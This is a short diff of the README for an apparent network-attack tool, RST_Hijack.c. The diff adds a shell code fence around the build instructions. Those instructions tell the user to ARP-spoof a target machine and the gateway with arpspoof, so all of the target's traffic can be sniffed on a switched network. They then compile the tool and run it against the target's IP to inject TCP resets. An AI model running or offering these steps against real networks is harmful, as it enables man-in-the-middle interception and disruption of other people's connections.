@@ -7,10 +7,13 @@ The author is not responsible for misuse.
 
 ## How to Build
 -For this code to work on a switched network , first you need to arp spoof , so you can sniff all the data that are passing through the network
+
+```sh
 1) sudo arpspoof -i <your-interface> -t <target-machine-ip> <gateway-ip>
 2) sudo arpspoof -i <your-interface> -t <gateway-ip> <target-machine-ip>
 3) sudo gcc RST_Hijack.c -o rst_hijack -lpcap -lnet
 4) sudo ./rst_hijack <Target-machine-ip>
+```
 
 ## Files
 - `RST_Hijack.c`: Main logic
